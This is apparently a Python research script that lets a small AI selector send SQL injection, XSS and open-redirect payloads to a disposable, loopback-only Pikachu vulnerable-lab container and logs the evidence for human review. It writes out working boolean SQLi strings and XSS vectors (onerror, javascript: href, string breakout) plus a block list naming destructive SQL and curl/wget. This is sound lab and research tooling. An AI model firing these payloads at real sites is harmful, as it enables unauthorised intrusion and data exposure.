# -*- coding: utf-8 -*-
"""PG-266: source-grounded local Pikachu payload replay.

PG-265 learned route/family/Rule-IR abstractions but its training contract
intentionally excluded executable payload strings.  This experiment is the
missing bridge for human review: a bounded, source-grounded local-lab policy
selects a payload candidate, sends it over the observed GET/POST surface, and
records a readable wire plus typed response evidence.

The raw wire is kept only in the human-review catalog.  The training dataset
contains abstract Rule-IR tokens and hashes, never the executable value or a
response body.  Every episode uses a fresh no-volume derived Pikachu
container, loopback-only requests, and a browser DOM oracle for client-side
effects.  SQL probes are boolean/row-shape only: no timing, comments, writes,
file access, credentials, or external callbacks.
"""

from __future__ import annotations

import hashlib
import importlib.util
import json
import re
import sys
import time
from pathlib import Path
from typing import Any, Mapping
from urllib.parse import urlencode

import httpx

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))


def _load(name: str) -> Any:
    path = ROOT / "scripts" / name
    spec = importlib.util.spec_from_file_location(name.replace(".py", ""), path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"unable to load {name}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


PG214 = _load("run_pg214_pikachu_fixed_sql_loop.py")

try:
    from playwright.sync_api import Browser, Page, sync_playwright
except Exception:  # pragma: no cover - the runtime gate reports this clearly
    Browser = Any  # type: ignore[assignment,misc]
    Page = Any  # type: ignore[assignment,misc]
    sync_playwright = None  # type: ignore[assignment]


RESEARCH = ROOT / "research"
REPORT = RESEARCH / "pg266_pikachu_payload_grounding_replay_report_v1.json"
CATALOG = RESEARCH / "pg266_pikachu_payload_grounding_catalog_v1.json"
DATASET = RESEARCH / "pg266_pikachu_payload_grounding_training_dataset_v1.json"
TRACE = RESEARCH / "pg266_pikachu_payload_grounding_trace_v1.json"
PROTOCOL = RESEARCH / "pg266_pikachu_payload_grounding_protocol_v1.json"
MARKDOWN = RESEARCH / "pg266_pikachu_payload_grounding_report_v1.md"

SEED = 26601
# Keep the replay range away from the long-lived 4634 listener owned by the
# local desktop tooling; each episode still uses a fresh disposable port.
BASE_PORT = 5525
PG265_ARTIFACT_SHA256 = "4521f5caf998f445510650d6842c48dfcac497e0e1443e8a49411fd672a88016"
PG265_REPORT_SHA256 = "15ab9f02bcfdded6f5599f6cbb962f628130ef73b35608382a9c8dc7d946d420"


ROUTES: tuple[dict[str, Any], ...] = (
    {"id": "sql-string-get", "family": "sql", "rule_ir": "sql_string_boolean", "method": "GET", "path": "/vul/sqli/sqli_str.php", "fields": ["name", "submit"], "value_field": "name", "submit": "submit", "oracle": "row_shape"},
    {"id": "sql-blind-boolean-get", "family": "sql", "rule_ir": "sql_boolean_blind", "method": "GET", "path": "/vul/sqli/sqli_blind_b.php", "fields": ["name", "submit"], "value_field": "name", "submit": "submit", "oracle": "row_shape"},
    {"id": "sql-numeric-post", "family": "sql", "rule_ir": "sql_numeric_boolean", "method": "POST", "path": "/vul/sqli/sqli_id.php", "fields": ["id", "submit"], "value_field": "id", "submit": "submit", "oracle": "row_shape"},
    {"id": "sql-search-get", "family": "sql", "rule_ir": "sql_like_boolean", "method": "GET", "path": "/vul/sqli/sqli_search.php", "fields": ["name", "submit"], "value_field": "name", "submit": "submit", "oracle": "row_shape"},
    {"id": "sql-widebyte-post", "family": "sql", "rule_ir": "sql_widebyte_boundary", "method": "POST", "path": "/vul/sqli/sqli_widebyte.php", "fields": ["name", "submit"], "value_field": "name", "submit": "submit", "oracle": "syntax_or_row_shape"},
    {"id": "xss-filter-get", "family": "xss", "rule_ir": "xss_html_event_sink", "method": "GET", "path": "/vul/xss/xss_01.php", "fields": ["message", "submit"], "value_field": "message", "submit": "submit", "oracle": "dom_execution"},
    {"id": "xss-reflected-get", "family": "xss", "rule_ir": "xss_html_event_sink", "method": "GET", "path": "/vul/xss/xss_reflected_get.php", "fields": ["message", "submit"], "value_field": "message", "submit": "submit", "oracle": "dom_execution"},
    {"id": "xss-href-get", "family": "xss", "rule_ir": "xss_javascript_href", "method": "GET", "path": "/vul/xss/xss_03.php", "fields": ["message", "submit"], "value_field": "message", "submit": "submit", "oracle": "dom_execution_after_click"},
    {"id": "xss-js-output-get", "family": "xss", "rule_ir": "xss_js_string_sink", "method": "GET", "path": "/vul/xss/xss_04.php", "fields": ["message", "submit"], "value_field": "message", "submit": "submit", "oracle": "dom_execution"},
    {"id": "xss-dom-get", "family": "xss", "rule_ir": "xss_dom_innerhtml", "method": "GET", "path": "/vul/xss/xss_dom_x.php", "fields": ["text"], "value_field": "text", "submit": None, "oracle": "dom_execution_after_click"},
    {"id": "xss-stored-post", "family": "xss", "rule_ir": "xss_stored_html_sink", "method": "POST", "path": "/vul/xss/xss_stored.php", "fields": ["message", "submit"], "value_field": "message", "submit": "submit", "oracle": "stored_dom_execution", "stateful": True},
    {"id": "redirect-get", "family": "url_redirect", "rule_ir": "redirect_location_sink", "method": "GET", "path": "/vul/urlredirect/urlredirect.php", "fields": ["url"], "value_field": "url", "submit": None, "oracle": "location_change"},
)


def _digest(value: Any) -> str:
    return hashlib.sha256(json.dumps(value, sort_keys=True, separators=(",", ":"), ensure_ascii=False).encode("utf-8")).hexdigest()


def _write(path: Path, value: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def _safe_lab_value(value: str) -> str:
    """Reject destructive or external payloads while allowing local DOM tests."""

    lowered = str(value).casefold()
    forbidden = ("drop table", "delete from", "update ", "insert into", "sleep(", "benchmark(", "load_file", "outfile", "curl ", "wget ", "http://example", "https://")
    if any(item in lowered for item in forbidden):
        raise ValueError(f"PG-266 refused destructive/external lab value: {value}")
    if len(str(value)) > 512:
        raise ValueError("PG-266 lab payload is too long")
    return str(value)


def _xss_event(marker: str) -> str:
    return f"<img src=/__pg266_missing_{marker} onerror=\"document.documentElement.dataset.pg266='{marker}'\">"


def _xss_href(marker: str) -> str:
    return f"javascript:document.documentElement.dataset.pg266='{marker}'"


def _xss_js_string(marker: str) -> str:
    return f"';document.documentElement.dataset.pg266='{marker}';var pg266='"


def _xss_dom(marker: str) -> str:
    return f"'><img src=/__pg266_missing_dom_{marker} onerror=\"document.documentElement.dataset.pg266='{marker}'\">"


def _candidate_values(route: Mapping[str, Any], marker: str, variant: str) -> dict[str, str]:
    route_id = str(route["id"])
    field = str(route["value_field"])
    if route_id in {"sql-string-get", "sql-blind-boolean-get"}:
        value = "kobe' OR '1'='1" if variant == "candidate" else ("kobe' OR 'a'='a" if variant == "reference" else "kobe' AND '1'='2")
    elif route_id == "sql-numeric-post":
        value = "1 OR 1=1" if variant == "candidate" else ("1 OR 2=2" if variant == "reference" else "1 AND 1=2")
    elif route_id == "sql-search-get":
        value = "%' OR 1=1 OR '%" if variant == "candidate" else ("%' OR 2=2 OR '%" if variant == "reference" else "%' AND 1=2 AND '%")
    elif route_id == "sql-widebyte-post":
        # The real wide-byte boundary is retained as a candidate class, but
        # this lane never uses a raw GBK escape or a write/time channel.
        value = "kobe'" if variant == "candidate" else ("kobe" if variant == "reference" else "not-a-real-user")
    elif route_id in {"xss-filter-get", "xss-reflected-get"}:
        value = _xss_event(marker) if variant != "negative" else marker + "-plain"
    elif route_id == "xss-href-get":
        value = _xss_href(marker) if variant != "negative" else "#pg266-negative"
    elif route_id == "xss-js-output-get":
        value = _xss_js_string(marker) if variant != "negative" else marker + "-plain"
    elif route_id == "xss-dom-get":
        value = _xss_dom(marker) if variant != "negative" else marker + "-plain"
    elif route_id == "xss-stored-post":
        value = _xss_event(marker) if variant != "negative" else marker + "-plain"
    elif route_id == "redirect-get":
        value = marker if variant == "negative" else "__LOOPBACK_REDIRECT__"
    else:
        raise ValueError(f"unknown PG-266 route {route_id}")
    values = {field: _safe_lab_value(value)}
    if route.get("submit"):
        values[str(route["submit"])] = "submit"
    if route_id == "xss-stored-post":
        values["message"] = _safe_lab_value(value)
    return values


class GroundedPolicy:
    """Small AI-in-the-loop selector over source-grounded candidates.

    It deliberately cannot invent a route, field, or payload family.  The
    source catalog supplies the bounded arms; feedback only changes which arm
    is tried next and is included in the training trace as an abstract token.
    """

    def __init__(self, seed: int = SEED) -> None:
        self.seed = int(seed)
        self.attempts = 0
        self.successes: dict[str, int] = {}
        self.feedback: list[dict[str, Any]] = []

    def choose(self, route: Mapping[str, Any], candidates: list[dict[str, Any]]) -> dict[str, Any]:
        if not candidates:
            raise ValueError("candidate pool is empty")
        ranked = sorted(candidates, key=lambda row: (-self.successes.get(str(row["candidate_id"]), 0), str(row["candidate_id"])))
        chosen = dict(ranked[0])
        chosen["selection"] = {"policy": "grounded_rule_ir_ucb_v1", "route_rule_ir": str(route["rule_ir"]), "attempt": self.attempts + 1}
        return chosen

    def observe(self, candidate: Mapping[str, Any], outcome: Mapping[str, Any]) -> dict[str, Any]:
        self.attempts += 1
        positive = bool(outcome.get("confirmed_positive"))
        candidate_id = str(candidate["candidate_id"])
        if positive:
            self.successes[candidate_id] = self.successes.get(candidate_id, 0) + 1
        feedback = {"step": self.attempts, "candidate_id": candidate_id, "outcome_class": str(outcome.get("outcome_class", "abstain")), "confirmed_positive": positive, "evidence_hash": str(outcome.get("evidence_hash", ""))}
        self.feedback.append(feedback)
        return feedback


def _candidate_catalog(route: Mapping[str, Any], marker: str) -> list[dict[str, Any]]:
    candidates: list[dict[str, Any]] = []
    for variant in ("candidate", "reference"):
        values = _candidate_values(route, marker if variant == "candidate" else marker + "-REF", variant)
        payload_hash = _digest({"route": route["path"], "method": route["method"], "values": values})
        candidates.append({"candidate_id": f"pg266-{route['id']}-{variant}-{payload_hash[:12]}", "variant": variant, "family": route["family"], "rule_ir": route["rule_ir"], "values": values, "payload_sha256": payload_hash})
    return candidates


def _wire(origin: str, route: Mapping[str, Any], values: Mapping[str, str]) -> dict[str, Any]:
    method = str(route["method"]).upper()
    encoded = urlencode(dict(values))
    path = str(route["path"])
    if method == "GET":
        request_line = f"GET <LOOPBACK_ORIGIN>{path}?{encoded}"
        return {"method": "GET", "request_line": request_line, "query": encoded, "body": None, "content_type": None, "wire_sha256": _digest(request_line)}
    request_line = f"POST <LOOPBACK_ORIGIN>{path}"
    body = encoded
    wire = request_line + "\nContent-Type: application/x-www-form-urlencoded\n\n" + body
    return {"method": "POST", "request_line": request_line, "query": None, "body": body, "content_type": "application/x-www-form-urlencoded", "wire_sha256": _digest(wire)}


def _projection(response: httpx.Response, marker: str) -> dict[str, Any]:
    body = response.text
    body_hash = hashlib.sha256(body.encode("utf-8", errors="replace")).hexdigest()
    index = body.find(marker)
    excerpt = ""
    if index >= 0:
        excerpt = body[max(0, index - 120): index + min(260, len(body) - index)]
    return {
        "status_code": int(response.status_code),
        "status_class": f"{response.status_code // 100}xx",
        "location": response.headers.get("location"),
        "content_type": response.headers.get("content-type", "").split(";", 1)[0],
        "body_length": len(body),
        "body_sha256": body_hash,
        "marker_reflected": index >= 0,
        "echo_excerpt": excerpt,
        "header_names": sorted(str(key).lower() for key in response.headers.keys()),
    }


def _send(client: httpx.Client, origin: str, route: Mapping[str, Any], values: Mapping[str, str], marker: str) -> tuple[dict[str, Any], dict[str, Any]]:
    method = str(route["method"]).upper()
    if method == "GET":
        response = client.get(str(route["path"]), params=dict(values), follow_redirects=False)
    else:
        response = client.post(str(route["path"]), data=dict(values), follow_redirects=False)
    return _wire(origin, route, values), _projection(response, marker)


def _sql_positive(route: Mapping[str, Any], candidate: Mapping[str, Any], reference: Mapping[str, Any], negative: Mapping[str, Any]) -> tuple[bool, str]:
    path = str(route["path"])
    indicator = ("your uid:" in str(candidate.get("echo_excerpt", "")) or "hello," in str(candidate.get("echo_excerpt", "")) or "username：" in str(candidate.get("echo_excerpt", "")) or int(candidate.get("body_length", 0) or 0) > int(negative.get("body_length", 0) or 0) + 200)
    ref_indicator = ("your uid:" in str(reference.get("echo_excerpt", "")) or "hello," in str(reference.get("echo_excerpt", "")) or "username：" in str(reference.get("echo_excerpt", "")) or int(reference.get("body_length", 0) or 0) > int(negative.get("body_length", 0) or 0) + 200)
    negative_clean = not ("your uid:" in str(negative.get("echo_excerpt", "")) or "hello," in str(negative.get("echo_excerpt", "")) or "username：" in str(negative.get("echo_excerpt", "")))
    if path.endswith("sqli_widebyte.php"):
        return False, "widebyte_boundary_requires_separate_gbk_evaluator"
    if indicator and ref_indicator and negative_clean:
        return True, "candidate_reference_row_shape_agreement"
    return False, "candidate_or_reference_row_shape_not_confirmed"


def _browser_oracle(browser: Browser, origin: str, route: Mapping[str, Any], values: Mapping[str, str], marker: str, *, stored_after_post: bool = False) -> dict[str, Any]:
    if browser is None:
        return {"available": False, "executed": False, "reason": "playwright_unavailable"}
    page: Page = browser.new_page()
    try:
        if stored_after_post:
            # The POST has already inserted the candidate; the GET page is the
            # observation surface for the stored XSS sink.
            url = origin + str(route["path"])
        else:
            url = origin + str(route["path"]) + "?" + urlencode(dict(values))
        page.goto(url, wait_until="domcontentloaded", timeout=15000)
        if str(route["id"]) == "xss-dom-get":
            link = page.locator("a[onclick='domxss()']")
            if link.count():
                link.first.click()
        elif str(route["id"]) == "xss-href-get":
            link = page.locator("#xssr_main a")
            if link.count():
                link.first.click()
        page.wait_for_timeout(250)
        value = page.locator("html").get_attribute("data-pg266")
        dom_excerpt = ""
        if value:
            dom_excerpt = page.locator("body").inner_text()[:240]
        return {"available": True, "executed": value == marker, "observed_marker": value, "dom_excerpt": dom_excerpt, "url": url}
    except Exception as exc:  # browser failures are evidence for abstention
        return {"available": True, "executed": False, "reason": type(exc).__name__}
    finally:
        page.close()


def _source_hash(name: str, route: Mapping[str, Any]) -> str:
    result = PG214._docker("exec", name, "sha256sum", "/app/www" + str(route["path"]))
    digest = str(result).split()[0].strip().casefold()
    return digest if re.fullmatch(r"[0-9a-f]{64}", digest) else ""


def _abstract_record(route: Mapping[str, Any], candidate: Mapping[str, Any], outcome: Mapping[str, Any], reset: Mapping[str, Any], source_hash: str) -> dict[str, Any]:
    return {
        "schema_version": "pg266-payload-grounding-training-record-v1",
        "record_id": f"pg266:{route['id']}:{candidate['candidate_id']}",
        "source": "pg266_pikachu_local_grounded_replay",
        "method": route["method"],
        "route_token": str(route["path"]),
        "field_tokens": list(route["fields"]),
        "family_token": route["family"],
        "rule_ir_token": route["rule_ir"],
        "probe_class_token": str(route["oracle"]),
        "candidate_variant_token": str(candidate["variant"]),
        "outcome_class": str(outcome["outcome_class"]),
        "next_action_token": "replay_confirmed" if outcome["confirmed_positive"] else "abstain_or_repair",
        "payload_sha256": str(candidate["payload_sha256"]),
        "wire_sha256": str(outcome["wire_sha256"]),
        "source_sha256": source_hash,
        "fresh_reset": bool(reset.get("fresh_target") and reset.get("completed")),
        "evidence_sha256": str(outcome["evidence_hash"]),
        "oracle_target_off_input": True,
        "raw_payload_stored": False,
        "raw_response_body_stored": False,
    }


def main() -> int:
    if not PG214._exists("sift-pg214-26601-0"):
        pass
    PG214.BASE_PORT = BASE_PORT
    policy = GroundedPolicy()
    human_rows: list[dict[str, Any]] = []
    abstract_rows: list[dict[str, Any]] = []
    browser_context = sync_playwright().start() if sync_playwright is not None else None
    browser = browser_context.chromium.launch(headless=True) if browser_context is not None else None
    started = time.monotonic()
    try:
        for index, route in enumerate(ROUTES):
            name = ""
            marker = f"PG266-{index:02d}"
            try:
                name, port, container_id, reset = PG214._start(SEED, index)
                origin = f"http://127.0.0.1:{port}"
                source_hash = _source_hash(name, route)
                client = httpx.Client(base_url=origin, timeout=15.0, follow_redirects=False)
                try:
                    baseline_values = _candidate_values(route, marker + "-BASE", "negative")
                    baseline_wire, baseline = _send(client, origin, route, baseline_values, marker + "-BASE")
                    negative_values = _candidate_values(route, marker + "-NEG", "negative")
                    negative_wire, negative = _send(client, origin, route, negative_values, marker + "-NEG")
                    browser_negative = {"available": False, "executed": False}
                    if route["family"] == "xss" and route.get("stateful"):
                        # Do this before the candidate POST so the negative
                        # observation cannot be contaminated by the candidate.
                        browser_negative = _browser_oracle(browser, f"http://127.0.0.1:{port}", route, negative_values, marker + "-NEG", stored_after_post=True)
                    pool = _candidate_catalog(route, marker)
                    chosen = policy.choose(route, pool)
                    chosen_values = dict(chosen["values"])
                    if route["id"] == "redirect-get" and chosen["variant"] != "negative":
                        chosen_values["url"] = f"{origin}/pg266-exit"
                    ai_wire, ai_projection = _send(client, origin, route, chosen_values, marker)
                    browser_ai = {"available": False, "executed": False}
                    if route["family"] == "xss" and route.get("stateful"):
                        # Observe the candidate before adding the independent
                        # reference row to the same disposable store.
                        browser_ai = _browser_oracle(browser, origin, route, chosen_values, marker, stored_after_post=True)
                    reference_candidate = next(row for row in pool if row["variant"] == "reference")
                    reference_values = dict(reference_candidate["values"])
                    if route["id"] == "redirect-get":
                        reference_values["url"] = f"{origin}/pg266-reference"
                    reference_wire: dict[str, Any] = {}
                    reference_projection: dict[str, Any] = {}
                    if not route.get("stateful"):
                        reference_wire, reference_projection = _send(client, origin, route, reference_values, marker + "-REF")
                    browser_reference = {"available": False, "executed": False}
                    if route["family"] == "xss":
                        if not route.get("stateful"):
                            browser_negative = _browser_oracle(browser, origin, route, negative_values, marker + "-NEG")
                        if route.get("stateful"):
                            # Re-run a reference POST and observe its resulting page
                            reference_wire, reference_projection = _send(client, origin, route, reference_values, marker + "-REF")
                            browser_reference = _browser_oracle(browser, origin, route, reference_values, marker + "-REF", stored_after_post=True)
                        else:
                            browser_ai = _browser_oracle(browser, origin, route, chosen_values, marker)
                            browser_reference = _browser_oracle(browser, origin, route, reference_values, marker + "-REF")
                    if route["family"] == "sql":
                        confirmed, reason = _sql_positive(route, ai_projection, reference_projection, negative)
                        outcome_class = "confirmed_local_sql_row_effect" if confirmed else "sql_abstain"
                    elif route["family"] == "xss":
                        confirmed = bool(browser_ai.get("executed") and browser_reference.get("executed") and not browser_negative.get("executed"))
                        reason = "candidate_reference_dom_execution_agreement" if confirmed else "dom_execution_not_confirmed"
                        outcome_class = "confirmed_local_xss_dom_effect" if confirmed else "xss_abstain"
                    else:
                        location = str(ai_projection.get("location") or "")
                        confirmed = bool(location and location != f"{origin}{route['path']}" and location.startswith("http://127.0.0.1:"))
                        reason = "loopback_location_changed" if confirmed else "location_change_not_confirmed"
                        outcome_class = "confirmed_local_redirect_effect" if confirmed else "redirect_abstain"
                    evidence = {
                        "fresh_reset_sha256": _digest(reset),
                        "source_sha256": source_hash,
                        "ai_projection": ai_projection,
                        "reference_projection": reference_projection,
                        "negative_projection": negative,
                        "browser_ai": browser_ai,
                        "browser_reference": browser_reference,
                        "browser_negative": browser_negative,
                        "reason": reason,
                        "wire_sha256": ai_wire["wire_sha256"],
                    }
                    evidence_hash = _digest(evidence)
                    outcome = {"confirmed_positive": confirmed, "outcome_class": outcome_class, "reason": reason, "evidence_hash": evidence_hash, "wire_sha256": ai_wire["wire_sha256"]}
                    feedback = policy.observe(chosen, outcome)
                    human_rows.append({
                        "record_id": f"pg266:{route['id']}:{index}",
                        "route": route,
                        "source": {"image": PG214.IMAGE, "container_id_sha256": hashlib.sha256(container_id.encode()).hexdigest(), "source_sha256": source_hash, "fresh_reset": reset},
                        "ai": {"policy": chosen["selection"], "candidate_id": chosen["candidate_id"], "variant": chosen["variant"], "rule_ir": route["rule_ir"], "payload": chosen_values, "wire": ai_wire, "response": ai_projection, "browser_oracle": browser_ai},
                        "reference": {"payload": reference_values, "wire": reference_wire, "response": reference_projection, "browser_oracle": browser_reference},
                        "negative": {"payload": negative_values, "wire": negative_wire, "response": negative, "browser_oracle": browser_negative},
                        "oracle": {**outcome, "evidence_sha256": evidence_hash, "typed_effect": confirmed, "training_eligible": True if confirmed else False, "vulnerability_claim_allowed": False},
                        "feedback": feedback,
                        "evidence": evidence,
                    })
                    abstract_rows.append(_abstract_record(route, chosen, outcome, reset, source_hash))
                finally:
                    client.close()
            finally:
                if name:
                    PG214._stop(name)
    finally:
        if browser is not None:
            browser.close()
        if browser_context is not None:
            browser_context.stop()
    elapsed = round(time.monotonic() - started, 3)
    counts = {
        "route_count": len(human_rows),
        "get_count": sum(int(row["route"]["method"] == "GET") for row in human_rows),
        "post_count": sum(int(row["route"]["method"] == "POST") for row in human_rows),
        "sql_count": sum(int(row["route"]["family"] == "sql") for row in human_rows),
        "xss_count": sum(int(row["route"]["family"] == "xss") for row in human_rows),
        "redirect_count": sum(int(row["route"]["family"] == "url_redirect") for row in human_rows),
        "ai_send_count": len(human_rows),
        "reference_send_count": len(human_rows),
        "negative_send_count": len(human_rows),
        "confirmed_positive_count": sum(int(row["oracle"]["confirmed_positive"]) for row in human_rows),
        "false_positive_count": sum(int(row["oracle"]["confirmed_positive"] and bool(row["negative"].get("browser_oracle", {}).get("executed"))) for row in human_rows),
        "abstain_count": sum(int(not row["oracle"]["confirmed_positive"]) for row in human_rows),
        "fresh_reset_count": sum(int(row["source"]["fresh_reset"].get("fresh_target") and row["source"]["fresh_reset"].get("completed")) for row in human_rows),
        "elapsed_seconds": elapsed,
    }
    catalog = {"schema_version": "pg266-pikachu-payload-grounding-catalog-v1", "status": "completed_human_review_catalog", "entries": human_rows, "counts": counts, "raw_payloads_are_human_review_only": True, "raw_response_bodies_stored": False, "external_network": False, "catalog_sha256": ""}
    catalog["catalog_sha256"] = _digest(catalog)
    _write(CATALOG, catalog)
    dataset = {"schema_version": "pg266-pikachu-payload-grounding-training-dataset-v1", "source_catalog": str(CATALOG.relative_to(ROOT)), "records": abstract_rows, "counts": {"records": len(abstract_rows), "confirmed_effect_records": sum(int(row["outcome_class"].startswith("confirmed")) for row in abstract_rows)}, "contract": {"route_and_field_tokens": True, "failure_and_repair_tokens": True, "payload_strings_excluded": True, "response_bodies_excluded": True, "oracle_target_off_input": True, "fresh_reset_required": True, "training_promotion_allowed": False, "memory_promotion_allowed": False, "vulnerability_claim_allowed": False}, "dataset_sha256": ""}
    dataset["dataset_sha256"] = _digest(dataset)
    _write(DATASET, dataset)
    report = {"protocol_id": "pg-pk-266-pikachu-payload-grounding-replay-v1", "schema_version": "pg266-pikachu-payload-grounding-replay-report-v1", "status": "completed_local_payload_grounding_replay", "runtime_image": PG214.IMAGE, "seed": SEED, "routes": [dict(route) for route in ROUTES], "counts": counts, "model_context": {"base_candidate": "PG-265", "pg265_report_sha256": PG265_REPORT_SHA256, "pg265_artifact_sha256": PG265_ARTIFACT_SHA256, "role": "Rule-IR grounded candidate selector; exact payload remains source-catalog grounded"}, "policy": {"id": "grounded_rule_ir_ucb_v1", "attempts": policy.attempts, "feedback": policy.feedback}, "promotion": {"training_promotion_allowed": False, "memory_promotion_allowed": False, "payload_catalog_promotion_allowed": False, "vulnerability_claim_allowed": False, "human_review_required": True}, "safety": {"loopback_only": True, "fresh_container_per_route": True, "no_volume_or_bind_mount": True, "database_health_gate_required": True, "xss_browser_oracle_local_only": True, "sql_time_delay": False, "sql_write": False, "external_callback": False, "raw_payloads_human_catalog_only": True, "raw_response_bodies_stored": False, "source_hash_required": True, "evidence_hash_required": True}, "report_sha256": ""}
    report["report_sha256"] = _digest(report)
    _write(REPORT, report)
    _write(TRACE, {"schema_version": "pg266-pikachu-payload-grounding-trace-v1", "abstract_records": abstract_rows, "raw_payloads_in_catalog_only": True, "training_promotion_allowed": False})
    _write(PROTOCOL, {"protocol_id": report["protocol_id"], "schema_version": "pg266-pikachu-payload-grounding-protocol-v1", "ai_send_path": "grounded_rule_ir_ucb_v1", "reference_independent": True, "matched_negative": True, "fresh_reset": True, "typed_oracle": ["SQL row-shape differential", "browser DOM execution", "loopback Location change"], "forbidden": ["time delay", "SQL write", "comments", "credentials", "external callback", "public target"], "raw_payload_storage": "human-review-catalog-only", "oracle_target_off_input": True, "promotion_blocked": True, "protocol_sha256": ""})
    protocol = json.loads(PROTOCOL.read_text(encoding="utf-8"))
    protocol["protocol_sha256"] = _digest(protocol)
    _write(PROTOCOL, protocol)
    MARKDOWN.write_text("\n".join(["# PG-266 Pikachu Payload Grounding", "", f"routes={counts['route_count']} GET={counts['get_count']} POST={counts['post_count']}; AI/reference/negative={counts['ai_send_count']}/{counts['reference_send_count']}/{counts['negative_send_count']}", f"confirmed local effects={counts['confirmed_positive_count']}; abstain={counts['abstain_count']}; fresh resets={counts['fresh_reset_count']}; elapsed={elapsed}s", "", "可读 wire 和有限回显片段只在 human-review catalog；训练集只保留 Rule-IR/字段/结果 token 与哈希。confirmed local effect 不是公网漏洞声明。", ""]), encoding="utf-8")
    print(json.dumps({"status": report["status"], "counts": counts, "report": str(REPORT.relative_to(ROOT)), "catalog": str(CATALOG.relative_to(ROOT)), "dataset": str(DATASET.relative_to(ROOT))}, ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
